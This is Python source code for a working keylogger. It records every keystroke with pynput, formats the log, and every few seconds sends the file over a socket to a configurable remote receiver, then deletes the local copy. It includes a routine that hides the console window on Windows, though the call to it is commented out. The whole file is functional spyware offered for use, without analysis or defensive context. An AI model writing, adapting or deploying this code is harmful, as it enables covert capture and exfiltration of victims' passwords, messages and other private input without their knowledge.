from pynput.keyboard import Key, Listener
import os
from multiprocessing import Process
import time
import socket
import tqdm


TEMP = "temp.txt"
FINAL = "final.txt"
host = "" ##IP ADDRESS of receiver

#### For testing purpose
with open(TEMP,'w') as file:
    file.close()
with open(FINAL,'w') as file:
    file.close()

#hide from cmd
def HideCmd():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


#invoked when the key is pressed
def on_press(key):
    global TEMP 
    
    #write the key in the file temp
    #if not present then make the file else write   
    
    if(os.path.exists(TEMP)):
        with open(TEMP,'a') as file:
            file.write(str(key))
            file.close()            
    else:
        with open(TEMP, 'w') as file:
            file.write(str(key))
            file.close()           


def listen():
    #listener function to be invoked
    with Listener(on_press=on_press) as listener:
        listener.join()




def copy_remove():
    global TEMP
    #global COPY
    
    #read from the file and set it to empty or remove it
    if(os.path.exists(TEMP)):
        with open(TEMP, 'r') as file:
            # as there is no space or new line we can take this at once
            final_string = file.read()
            file.close()
        
        #deleted the file
        os.remove(TEMP)
    
    else:
        final_string = None
    
    return final_string

    
def final_file(st):
    global FINAL

    prev = ""
    count = 0
    i=0
    
    with open(FINAL, 'a') as file:
        while(i < len(st)):
            if(st[i] == "'"):
                if(prev != ""):
                    if(count>1):
                        file.write(str(count))
                        count = 0
                    file.write(">")
                    prev = ""
                
                i += 1
                file.write(st[i])
                i += 2
            
            else:
                # it will be a key
                if(st[i]=="K"):
                    i += 4
                    temp = ""
            
                    while(i<len(st) and st[i] != "K" and st[i] != "'"):
                        temp += st[i]
                        i += 1
                    if(prev == temp):
                        count += 1
                    else:
                        if(temp == "space"):
                            file.write(" ")
                        elif(not temp.lower().find("enter")==-1):
                            file.write("\n")
                        else:
                            if(prev != ""):
                                if(count>1):
                                    file.write(str(count))
                                file.write(">")
                            prev = temp
                            count = 1
                            file.write("<")
                            file.write(temp)
                        
        if(prev != ""):
            if(count > 1):
                file.write(str(count))
            file.write(">")
    
        file.close()
    
def send():
    global FINAL
    global host
    
    SEPARATOR = "<SEPARATOR>"
    BUFFER_SIZE = 4096 # send 4096 bytes each time step
    
    # the port, let's use 5001
    port = 80
    # get the file size
    filesize = os.path.getsize(FINAL)
    
    # create the client socket
    s = socket.socket()
    
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    
    # send the filename and filesize
    s.send(f"{FINAL}{SEPARATOR}{os.stat(FINAL).st_size}".encode())
    
    # start sending the file
    progress = tqdm.tqdm(range(os.stat(FINAL).st_size), f"Sending {FINAL}")
    with open(FINAL, "rb") as f:
        for _ in progress:
            # read the bytes from the file
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in 
            # busy networks
            s.send(bytes_read)
            # update the progress bar
            progress.update(len(bytes_read))
    # close the socket
    s.close()    
    #send file to the destination
    print("FILE SENT")

    # delete the final file
    os.remove(FINAL)
    

def aim():
    #infinite loop for sending the data 
    while(True):
        #add sleep for 10 minutes
        time.sleep(10)
    
        #copy the file so that time in changing don't effect and set it to empty or remove it
        final_string = copy_remove()

        #write in new file in good and readable manner if anything has been typed at all
        if(final_string==None):
            #no data present and hence no need to go ahead
            continue
        else:
            final_file(final_string)

        #send file to the destination
        send()
    
    pass

if(__name__=='__main__'):
    #HideCmd()
    
    #Process to listen to the whole keys
    Process(target=listen).start()

    #Process for saving in readable manner and then sending to the desired system
    Process(target=aim).start()
